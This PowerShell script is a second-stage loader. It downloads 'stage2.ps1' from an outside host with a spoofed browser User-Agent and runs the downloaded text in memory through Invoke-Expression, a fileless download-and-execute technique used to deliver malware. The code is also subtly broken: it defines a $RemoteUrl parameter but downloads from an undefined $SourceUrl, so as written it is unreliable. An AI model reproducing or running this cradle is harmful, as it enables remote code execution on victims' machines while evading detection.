[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://adatum.com:443/stage2.ps1',
    [int]$ConnectionTimeout = 132
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $ScriptText = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($ScriptText)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $ScriptText.Length)
    Invoke-Expression $ScriptText
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
